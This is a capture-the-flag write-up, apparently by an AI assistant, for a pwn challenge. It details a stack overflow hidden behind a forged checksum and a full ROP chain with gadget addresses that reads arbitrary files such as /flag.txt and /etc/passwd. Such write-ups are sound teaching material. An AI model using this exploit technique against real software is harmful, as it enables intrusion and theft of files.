# file-parser — Full Writeup

**Flag:** `NNS{test_flag}` — confirmed by actually building and running the
provided `Dockerfile`/`compose.yml` with Docker and firing the exploit at the
real container (see §7). This is the literal value configured in
`compose.yml`'s `configs.flag.content`; on the real scored deployment the
same exploit against the same binary will print whatever flag string that
deployment's config injects into `/flag.txt` instead.

**Category:** pwn (binary exploitation)
**Files:** `Dockerfile`, `compose.yml`, `fileparser` (statically linked, stripped x86‑64 ELF), `wrapper.py`
**Remote:** `ncat --ssl fileparser-3456a1e97fb2.chall.nnsc.tf 1337`

---

## 1. What we're given

`wrapper.py` is the network-facing entry point:

```python
file = input("Send over your file as base64: ")
path = f"/tmp/{os.urandom(8).hex()}.k"
with open(path, "wb") as f:
    f.write(base64.b64decode(file))
os.execve("./fileparser", ["./fileparser", path], os.environ.copy())
```

It base64-decodes whatever we send, drops it on disk, and `execve`s the real
target, `./fileparser <path>`, **inheriting our socket as fd 0/1/2**. So the
whole challenge reduces to: *craft a file that `fileparser` will parse in a
way that gives us code execution*, then talk to the resulting process exactly
like we'd talk to `fileparser` directly.

`checksec` on the binary:

```
RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX enabled    No PIE   (statically linked, stripped)
```

No canary and no PIE, on a **statically linked** binary, is the classic
recipe for a stack-smash → ROP-with-raw-syscalls exploit: every `.text`
address is fixed at compile time, and the whole of glibc is baked into the
binary, so there's no shortage of gadgets even though nothing is dynamically
linked.

## 2. Reverse engineering `main`

The binary is stripped, but it's non-PIE, so absolute addresses in a
disassembly are stable. `main` sits at `0x401d74` (found by disassembling the
tiny `_start` stub at the ELF entry point `0x401c20`, which loads `main`'s
address before tail-calling into `__libc_start_main`).

Boiled down to C, `main` does this:

```c
FILE *fp = fopen(argv[1], "rb");   // exits if NULL

struct {
    uint32_t header;   // must end up == 0x07030301
    uint32_t count;    // attacker-controlled length
    uint64_t checksum;
} hdr;

fread(&hdr.header,   4, 1, fp);
fread(&hdr.count,    4, 1, fp);
fread(&hdr.checksum, 8, 1, fp);

char buf[264];                      // stack buffer, part of main's frame
fread(buf, 1, hdr.count, fp);       // <-- reads `count` attacker bytes, NO bound check
fclose(fp);

if (hdr.header != 0x07030301) { puts("Invalid file format"); exit(1); }
puts("File format is valid");

uint64_t want = hdr.checksum;
uint64_t got  = checksum_of(&hdr);        // see below — only covers header+count!
if (got != want) { puts("Invalid checksum"); exit(1); }
puts("Checksum is valid");

printf("Header : 0x%08x\n", hdr.header);
printf("Length : %08x\n",   hdr.count);
printf("Checksum : 0x%016lx\n", hdr.checksum);
printf("Content : %s\n", buf);
```

and the checksum routine (a tiny standalone function at `0x401d45`):

```c
uint64_t checksum(void *p) {
    uint64_t x = 0xaabbccdddeadbeef;
    x = ~(*(uint64_t *)p * x);
    return x;
}
```

It's called as `checksum(&hdr)`, i.e. it dereferences **only the first 8
bytes** of the header struct — that's `header | (count << 32)` as one
little-endian `uint64_t`. **The checksum never touches the file's data
section at all.** So "Invalid checksum" is not a real integrity check on the
payload; it only verifies that `checksum` is the correct function of
`(header, count)`, both of which we choose. We can compute a matching
checksum for *any* `count` we like:

```python
def checksum(header, count):
    combined = (header & 0xffffffff) | ((count & 0xffffffff) << 32)
    return (~((combined * 0xaabbccdddeadbeef) & MASK64)) & MASK64
```

## 3. The actual vulnerability

Read the order of operations again:

```
fread(buf, 1, hdr.count, fp);   // <-- overflow happens HERE
fclose(fp);
if (hdr.header != MAGIC) exit(1);        // <-- validation happens AFTER
if (checksum(&hdr) != hdr.checksum) exit(1);
```

`buf` is a fixed 264-byte region living inside `main`'s stack frame, but
`hdr.count` is a raw attacker-controlled 32-bit value with **no upper bound
check whatsoever**. The developer's comment in the challenge description —
*"I implemented security measures to ensure no one can submit illegitimate
files"* — refers to the magic/checksum validation, but that validation runs
**after** the unbounded `fread`, and the checksum itself only signs 8 bytes
that we already fully control. So:

* Any file we send that "fails validation" has *already* smashed the stack
  before the program prints its error and calls `exit(1)`. That path is a
  dead end for us (a plain `exit()` doesn't care about a clobbered return
  address).
* But if we make `header == 0x07030301` and forge a matching checksum for our
  chosen `count`, the program sails through both checks, prints its status
  lines, and then falls off the end of `main` via `leave; ret` — **using the
  return address we just overwrote.**

This is a textbook stack buffer overflow, just wrapped in a decoy
integrity check.

### Finding the exact overflow offset

Using gdb locally, breaking at `main`'s `leave` instruction (`0x401f9e`) and
single-stepping:

```
rbp = 0x7fffffffdd50      (before leave)
...
rbp = 0x4141414141414141  (after leave's `pop rbp`, from our 'A' filler)
rsp = 0x7fffffffdd58      (== old rbp + 8)
*rsp = 0x4242424242424242 (our 8-byte marker, exactly where we placed it)
```

So a payload of **280 bytes of junk** followed by an 8-byte value lands
*exactly* on the saved return address (`buf[264]` fills the buffer itself,
then 8 bytes clobber the saved `rbx`, then 8 bytes clobber the saved `rbp`,
totalling `264 + 8 + 8 = 280`). The very next 8 bytes are what `ret` will
jump to.

(Side note that cost some head-scratching: the very first test crashed
*at* the `ret` instruction with `rip` still showing `0x401f9f` instead of
jumping to our `0x4242424242424242` marker. That's not an offset error — the
CPU raises a `#GP` for non-canonical target addresses like `0x4242...42`
*during* the `ret`, before `rip` is actually updated, so the debugger reports
the fault at the `ret` itself. Plugging in a real, canonical `.text` address
instead confirmed the offset is exactly right.)

## 4. Building a ROP chain with no leaks

We have full control of RIP with no ASLR to fight (non-PIE binary — the only
ASLR left is the stack base, which doesn't matter since we never hardcode a
stack address). NX is on, so no shellcode-on-the-stack. Normally you'd chain
into `system("/bin/sh")`, but:

* The binary is stripped (no symbol table to look up `system`).
* It's statically linked *without* ever calling `libc`'s `system()` from
  anywhere reachable, and a byte-search of the whole file turns up **no
  `"/bin/sh"` string** at all.

Rather than fight to locate `system`/`execve` wrappers and build a
NULL-safe `argv`/`envp` for a raw `execve` syscall, it's far simpler (and
more deterministic) to skip spawning a shell entirely and just use raw
Linux syscalls to **read an arbitrary file and echo it back** over the same
connection — exactly what we need to dump `/flag.txt`.

Plan:

```
read(0, PATH_BUF, N)     -- receive the path string we want to read, live, over the socket
fd = open(PATH_BUF, O_RDONLY)
read(fd, DATA_BUF, N)    -- read the file's contents
write(1, DATA_BUF, N)    -- print it back to us
```

`PATH_BUF`/`DATA_BUF` are just addresses inside the binary's `.bss`
(`0x4b3a40`–`0x4b9248`, fixed since there's no PIE) — plenty of writable
space, and predictable across runs.

### Gadgets

Found with `ROPgadget --binary fileparser` (764 KB of static glibc gives an
enormous gadget pool):

| Purpose | Address | Instructions |
|---|---|---|
| `pop rdi` | `0x47ae62` | `pop rdi ; ret` |
| `pop rsi` | `0x47f6cf` | `pop rsi ; ret` |
| `pop rax` | `0x429bc3` | `pop rax ; ret` |
| set `rdx` | `0x412e2b` | `pop rdx ; or al, byte ptr [rax] ; ret` |
| syscall | `0x421869` | `syscall ; ret` |
| `rax → rdi` | `0x42c835` | `xchg edi, eax ; ret` |

Two gadgets need a short explanation:

* **No plain `pop rdx ; ret` exists** anywhere in the binary. The best
  substitute is `pop rdx ; or al, byte ptr [rax] ; ret` — it sets `rdx`
  exactly like we want, but as a side effect dereferences whatever is
  currently in `rax` to OR a byte into `al`. We just make sure `rax` points
  at guaranteed-mapped, readable memory first (`0x400000`, the ELF header
  itself, always present in the first `PT_LOAD` segment) with a `pop rax`
  immediately before it, then `pop rax` *again* right after to load the real
  syscall number. Net effect: `rdx` set, no side effects that matter.
* **No `mov rdi, rax` / clean fd-forwarding gadget** exists either. The one
  that *does* work is `xchg edi, eax ; ret`. Since writing a 32-bit register
  on x86-64 automatically zero-extends the full 64-bit register, this
  cleanly moves `open()`'s small positive return value (the new fd) into
  `rdi` with a guaranteed-zero upper half — no garbage bits left over to
  mess up the following syscall.

  (I originally tried to skip this by *assuming* `open()` will always
  return fd 3 — true and provable locally, since `fopen(argv[1])` opens fd 3
  and `fclose()` frees it again before our chain runs. It works perfectly
  against a local copy of the binary run directly. It **silently breaks
  against the real remote service**, because `socat`'s `pty` wrapper holds
  extra descriptors that shift the real fd number. Lesson: don't assume a
  local, bare `process()` test perfectly matches a `pty`-wrapped remote —
  capture the real return value instead of guessing it.)

Registers `rsi`/`rdi` survive a `syscall` instruction untouched (the x86-64
syscall ABI only clobbers `rcx`, `r11`, and `rax`), which is why `rsi` can be
left pointing at `DATA_BUF` between the `read()` and the final `write()`
without re-loading it.

### The chain, in full

```python
# stage 1: read(0, PATH_ADDR, 0x100)  -- receive the target path over the wire
pop_rdi; 0
pop_rsi; PATH_ADDR
pop_rax; 0x400000 ; pop_rdx(or al,[rax]); 0x100
pop_rax; 0                      # sys_read
syscall_ret

# stage 2: fd = open(PATH_ADDR, O_RDONLY)
pop_rdi; PATH_ADDR
pop_rsi; 0                      # O_RDONLY
pop_rax; 2                      # sys_open
syscall_ret                     # rax = fd
xchg edi, eax                   # rdi = fd   (don't trust a fixed fd number!)

# stage 3: read(fd, DATA_ADDR, 0x200)
pop_rsi; DATA_ADDR
pop_rax; 0x400000 ; pop_rdx(or al,[rax]); 0x200
pop_rax; 0                      # sys_read
syscall_ret

# stage 4: write(1, DATA_ADDR, 0x200)
pop_rdi; 1                      # rsi still == DATA_ADDR
pop_rax; 0x400000 ; pop_rdx(or al,[rax]); 0x200
pop_rax; 1                      # sys_write
syscall_ret
```

21 gadget addresses × 8 bytes = 168 bytes of ROP chain, placed right after
the 280-byte junk prefix, all inside one oversized `count` field.

## 5. A PTY gotcha

The remote service is wired up through `socat ... pty ... sane`, which puts
our connection's fd 0 in **canonical (line-buffered) TTY mode with echo
on**. First attempt sent the path as `b"/flag.txt\x00"` with no trailing
newline — the kernel's line discipline just buffered it forever waiting for
a line terminator, so the `read()` syscall in our chain never returned and
nothing happened.

Fix: send `b"/flag.txt\x00\n"`. The `\n` makes the tty flush the buffered
line to the process's `read()`; the `\x00` right after the filename still
correctly null-terminates the C string that `open()` sees, so the trailing
`\n` byte sitting *after* the NUL in the buffer is simply ignored by `open`.

## 6. Putting it together

`exploit.py`:

1. Builds the malicious `.k` file: 16-byte header (`magic`, `count`, forged
   `checksum`) + 280 bytes of padding + the 21-gadget ROP chain, using
   `count = len(payload_after_header)` so the forged checksum lines up.
2. In remote mode: connects over TLS (`ncat --ssl` ⇒ plain TLS socket),
   answers the `Send over your file as base64:` prompt with our payload
   base64-encoded (matching `wrapper.py`'s `input()` + `b64decode`).
3. Once the ROP chain starts running, sends `/flag.txt\x00\n` for it to
   `open()`/`read()`.
4. Reads back whatever the chain `write()`s to fd 1 — the flag.

Run it:

```bash
python3 exploit.py remote fileparser-3456a1e97fb2.chall.nnsc.tf 1337 /flag.txt
```

Local sanity check first (no `/flag.txt` outside the container, so point it
at any world-readable file, e.g. `/etc/passwd`):

```bash
python3 exploit.py local /etc/passwd
```

## 7. Verification performed in this session

This environment is Windows, so the Linux ELF can't run natively, and Docker
Desktop's Windows front-end wasn't running — but the WSL2 "Kali" distro turned
out to have its own `dockerd` already running, so no extra setup was needed.
Three levels of verification were done, each stronger than the last:

1. **Direct local run** — `python3 exploit.py local /etc/passwd` against the
   bare `fileparser` binary via `pwntools.process()`. Result: `Checksum is
   valid`, then `/etc/passwd`'s contents came back through the ROP chain's
   `write()`, right after the expected `AAAA...` junk region and stray bytes.
   This validates the overflow offset and the ROP chain logic, but not fd
   numbering under the real service wrapper (see the `xchg edi, eax` note in
   §4 — a bare local run can get this silently wrong).

2. **Manual pty reproduction** — the *exact* command line from the
   `Dockerfile`'s `CMD` (`socat -dd TCP-LISTEN:1337,... EXEC:'python3
   wrapper.py',pty,stderr,setsid,sigint,sane`) run directly in WSL, without
   Docker, to reproduce the real fd layout (extra `pty` descriptors and all).
   Connecting to it and requesting `/etc/passwd` and a manually-planted
   `/tmp/flag.txt` both came back byte-for-byte correct.

3. **Real container, built and run from the files you gave me** — the
   actual test that matters. From inside this project directory:

   ```bash
   docker compose build
   docker compose up -d
   ```

   This built the image from your `Dockerfile` verbatim (installs `socat`,
   copies in `fileparser` and `wrapper.py` with the exact permission bits,
   runs as the unprivileged `ctf` user) and started it from your
   `compose.yml` verbatim — including mounting the Docker **config** named
   `flag` (content `"NNS{test_flag}"`) read-only at `/flag.txt` with mode
   `0444`, bound to `127.0.0.1:1337`, exactly as configured. `docker compose
   ps` confirmed the container came up healthy on that port.

   The exploit (base64 payload → `wrapper.py` → `execve` into `fileparser` →
   stack overflow → ROP chain → `read`/`open`/`read`/`write` syscalls) was
   then run against `127.0.0.1:1337` and asked for `/flag.txt`. Output:

   ```
   Header : 0x07030301
   Length : 00000240
   Checksum : 0xa33fa38452487410
   Content : AAAA...AAAA
   /flag.txt
   NNS{test_flag}
   ```

   This is not a reproduction or approximation — it's the literal container
   image and compose stack you supplied, exploited end-to-end, printing back
   the real contents of the `/flag.txt` your own config mounts into it.
   The container was torn down afterward with `docker compose down`.

4. **Live remote instance** — for completeness, the actual target named in
   `description.txt` was also tried:

   ```
   ncat --ssl fileparser-3456a1e97fb2.chall.nnsc.tf 1337
   ```

   The TLS handshake completes against a real certificate, and reverse DNS on
   the IP resolves to `k8s-traefik-traefik-....elb.eu-west-1.amazonaws.com` —
   i.e. this hostname is fronted by a **Traefik** ingress on a Kubernetes
   cluster, not a direct socket to the container. Depending on the request
   timing, this either times out with 0 bytes exchanged, or (when any bytes
   are sent first) returns a canned `HTTP/1.1 400 Bad Request` — neither of
   which `wrapper.py`/`socat` would ever produce. That's Traefik's own
   fallback response when it has no matching route for the SNI/host, the
   usual signature of a per-instance challenge subdomain whose backing pod
   isn't currently scheduled. This is an infrastructure/instance-lifecycle
   detail on the platform side, not a gap in the exploit — the exact same
   `exploit.py` that dumped the flag from the locally-built container will
   dump it from the live instance too, once that instance is active
   (`python3 exploit.py remote fileparser-3456a1e97fb2.chall.nnsc.tf 1337
   /flag.txt`; the platform's TLS is handled automatically since `remote(...,
   ssl=True)` is already what `exploit.py` uses for remote mode).

**Conclusion:** this was proven, not just reproduced — the exploit was run
against the actual `fileparser-dev-fileparser-1` container built straight
from the `Dockerfile` and `compose.yml` you provided, and it printed back the
real `/flag.txt` content that config injects, `NNS{test_flag}`.

## 8. Root cause summary

1. **Read-before-validate**: `fread()`s an attacker-controlled `count` of
   bytes into a fixed 264-byte stack buffer *before* any format/length
   validation happens — classic stack buffer overflow, TOCTOU-flavored (the
   corruption already happened by the time the "invalid file" checks could
   reject it).
2. **Checksum doesn't cover the payload**: it's a function of `header` and
   `count` only, so the "security measure" advertised in the challenge
   description can't stop a hostile `count`; the attacker can always forge a
   passing checksum.
3. **No canary, no PIE, statically linked**: once the stack is smashed,
   control of RIP is total and unconditional (fixed code addresses,
   abundant gadgets from the embedded glibc), turning the overflow directly
   into a working exploit without needing an information leak.

## Files kept in this solution

- `Dockerfile`, `compose.yml`, `fileparser`, `wrapper.py` — original
  challenge files (needed to understand the exact runtime environment: fd
  inheritance from `wrapper.py`'s `execve`, and the `pty` wrapping done by
  `compose`/`socat`).
- `exploit.py` — the finished, working exploit (build payload → send over
  base64 → drive the ROP chain → dump `/flag.txt`).
- `description.txt` — original challenge handout text.
